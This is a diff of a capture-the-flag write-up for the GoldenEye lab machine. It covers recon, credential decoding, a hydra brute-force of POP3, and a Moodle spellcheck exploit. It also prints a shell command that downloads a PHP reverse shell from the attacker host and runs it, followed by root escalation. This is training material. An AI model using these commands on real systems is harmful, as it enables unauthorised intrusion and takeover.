@@ -8,17 +8,7 @@ The first step is to run an NMap scan against the system
 A few services are uncovered.
 ![tcpnmap](https://user-images.githubusercontent.com/15524701/43056876-6018ca72-8e04-11e8-9c9e-b6f5edcc0d1b.jpeg)
 
-![comment-sev-home](https://user-images.githubusercontent.com/15524701/43056863-5ef4fc7e-8e04-11e8-989c-395d0797677c.jpeg)
-![comment-sev-home2](https://user-images.githubusercontent.com/15524701/43056866-5f4620c2-8e04-11e8-81d7-44807c41bcff.jpeg)
-![comment-terminal](https://user-images.githubusercontent.com/15524701/43056867-5f586156-8e04-11e8-80de-ba1b0c06dbc6.jpeg)
-![flag](https://user-images.githubusercontent.com/15524701/43056868-5f6dea80-8e04-11e8-903e-faef98967592.jpeg)
-![flag_anim](https://user-images.githubusercontent.com/15524701/43056869-5f81dfb8-8e04-11e8-8736-58a2fdac56a0.jpeg)
-![messaging](https://user-images.githubusercontent.com/15524701/43056870-5f9233ea-8e04-11e8-9f60-5b92d78bb969.jpeg)
-![redirect](https://user-images.githubusercontent.com/15524701/43056871-5fa6aeec-8e04-11e8-9eec-4a863aa96303.jpeg)
-![regex](https://user-images.githubusercontent.com/15524701/43056872-5fb8a00c-8e04-11e8-8e65-7de9ec0c7046.jpeg)
-![sniper](https://user-images.githubusercontent.com/15524701/43056873-5fdb04a8-8e04-11e8-8ea1-33ba3a09d36c.png)
-![spellcheck](https://user-images.githubusercontent.com/15524701/43056874-5fec938a-8e04-11e8-900c-2038c113d74d.jpeg)
-![systempaths](https://user-images.githubusercontent.com/15524701/43056875-60002f44-8e04-11e8-845b-96883d2bba3a.jpeg)
+
 
 This is my first writeup, and also the first writeup i know of for the GoldenEye box.
 
@@ -31,11 +21,21 @@ I always recon webservices first. Some text appears on the index.html page of th
 
 Before doing that, I spidered spidering the page starting off at index.html and wound up finding a few items linked. I reviewed the source, but terminal.js (linked via a `src` tag in index.html) turned up gold. 
 
+
+![comment-terminal](https://user-images.githubusercontent.com/15524701/43056867-5f586156-8e04-11e8-80de-ba1b0c06dbc6.jpeg)
+
+![regex](https://user-images.githubusercontent.com/15524701/43056872-5fb8a00c-8e04-11e8-8e65-7de9ec0c7046.jpeg)
+![sniper](https://user-images.githubusercontent.com/15524701/43056873-5fdb04a8-8e04-11e8-8ea1-33ba3a09d36c.png)
+
+
 The source of terminal.js exposes credentials for a user named Boris. These have a strange encoding that’s difficult to Google for since the search feature will filter ampersands and hash symbols, so I searched for “ampersand hash encoding”. The results indicated the associated password is encoded as semi-colon delimited HTML entities. We convert them into ASCII and get the credentials for user Boris with the following Python 2 one-liner which leverages the stdlib:
 
 python -c 'import HTMLParser;h=HTMLParser.HTMLParser();s= h.unescape("&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;");print s'
 
-We use the credentials to login to /sev-home/ and look at the source of the landing page. There is a spiel in the comments about approved “operators”; in addition to mentioning Boris, it gives us another username, Natalya.
+We use the credentials to login to /sev-home/ and look at the source of the landing page. There is a spiel in the comments about approved “operators”; in addition to mentioning Boris, it gives us another username, Natalya. This comment is easily missed if you're not paying attention and are fooled by the slick whitespace after line 24.
+
+![comment-sev-home](https://user-images.githubusercontent.com/15524701/43056863-5ef4fc7e-8e04-11e8-989c-395d0797677c.jpeg)
+![comment-sev-home2](https://user-images.githubusercontent.com/15524701/43056866-5f4620c2-8e04-11e8-81d7-44807c41bcff.jpeg)
 
 I failed to find additional interesting pages after additional spidering and brute-forcing of this authenticated area of the server and turned back towards the other services discovered by nmap.
 
@@ -51,10 +51,13 @@ hydra -e nsr 172.16.2.33 pop3 -l boris -P /usr/share/wordlists/fasttrack.txt  -s
 The fasttrack.txt list (not the one generated with Cewl) was sufficient to crack both users mail accounts. 
 
 We login as each user and retrieve their emails with STAT (to view the number of messages) and RETR x (retrieves the specified message where x is the message number). The emails turned up an additional subdirectory of the HTTP server to attack, /gnocertdir. 
+
+
 In addition, we get the credentials for a user named xenia (who doesn’t appear to exist on the mailserver).
 
 
 On trying to navigate to the same directory via the IP address of the host, a failure message would appear.
+![redirect](https://user-images.githubusercontent.com/15524701/43056871-5fa6aeec-8e04-11e8-9eec-4a863aa96303.jpeg)
 
 It turns out the subdirectories would only be accessible if we accessed them by navigating to hostname severnaya-station[.]com. This can be done by mapping the ip of the VM to severnaya-station.com in the /etc/hosts file on your attacker machine (this /etc/hosts hint was provided in one of the exposed emails).
 
@@ -71,12 +74,16 @@ In addition to comments, emails can be searched for with the following very hack
 The above don’t turn up anything of use. 
 
 After several passes through the app, and source code of the pages, I did eventually find something in the messaging system: a communication between an “admin” and the current user Xenia, which contained another email address, “doak@”. 
+![messaging](https://user-images.githubusercontent.com/15524701/43056870-5f9233ea-8e04-11e8-9f60-5b92d78bb969.jpeg)
 
 This was missed by the above regexes because it required interaction with the appropriate part of the page in order for the message contents to be returned in a response. After interacting with that page, the first hackish/greedy regex will match on the address.
 
 We head back to the SMTP service and run `VRFY doak` which presents us with a message that confirms the user is known to the mailserver. Then we run another bruteforce against the user with the same fasttrack.txt wordlist.
 
-Upon getting the users messages with STAT (to view the number of messages) and RETR x (where x is the message number), we obtain administrator credentials for the Moodle site at severnaya-station.com/gnocertdir. 
+Upon getting the users messages with STAT (to view the number of messages) and RETR x (where x is the message number), we obtain a hint that there's directory which contains some sort of useful information that can't be communicated over email. We travel to the directory and all we find there is an image. I downloaded the image and ran `strings` over it and some of the exif data appeared to contain a base64 encoded string. I decoded this with 
+`python -c 'import base64;s=base64.b64decode("eFdpbnRlcjE5OTV4IQ==");print s'`
+
+administrator credentials for the Moodle site at severnaya-station.com/gnocertdir. 
 
 This next part was a bit difficult. 
 
@@ -91,6 +98,7 @@ I searched google for Moodle changelogs and was able to determine the versions o
 
 Armed with this information i went back through the exploit-db exploits, and also decided to search about in metasploit (after launching metasploit with msfconsole enter search moodle and wait for results to appear). The following exploit is the only result for moodle, and appears to target version 2.2.3. Putting in the admin creds and targeting the site, the exploit runs but failed to generate a shell. I looked further into the source code and noticed it was trying to target the same area of the application referenced in the system path page, which appeared to have the ability to run shell commands.
 
+![systempaths](https://user-images.githubusercontent.com/15524701/43056875-60002f44-8e04-11e8-845b-96883d2bba3a.jpeg)
 
 
 I had been confused earlier as the exploits noted appeared to target aspell, but the tinyMCE editor only had PSpell listed as an available plugin. However a quick google search showed that PSpell was dependent on aspell installations, so I surmised this dependency could trigger the vulnerability. First I created my payload: 
@@ -102,7 +110,7 @@ I then manually edited the sh command that was originally meant to trigger the s
 sh -c '(wget 172.16.2.2/phprev443perl.php -O/tmp/phprev443perl.php && php /tmp/phprev443perl.php)'
 
 After setting up my listener, I then navigated to a page that had a text editor running, and looked for the spellcheck option.
-
+![spellcheck](https://user-images.githubusercontent.com/15524701/43056874-5fec938a-8e04-11e8-900c-2038c113d74d.jpeg)
 
 (The rightmost button in the bottom row activates the spellcehck feature).
 
@@ -136,7 +144,8 @@ I used curl to download the source for the exploit to /tmp/ on the goldeneye hos
 Several ugly looking warnings were generated, but unlike errors, warnings aren’t fatal.
 I ran the compiled binary and the repl shifted to a newline and displayed #.
 running whoami confirmed I had root privileges. I navigated to the /root/ dir, viewed the flag, and treated myself to the reward left by the author, which anyone who’s seen Goldeneye will appreciate.
-
+![flag](https://user-images.githubusercontent.com/15524701/43056868-5f6dea80-8e04-11e8-903e-faef98967592.jpeg)
+![flag_anim](https://user-images.githubusercontent.com/15524701/43056869-5f81dfb8-8e04-11e8-8736-58a2fdac56a0.jpeg)
 #
 
 
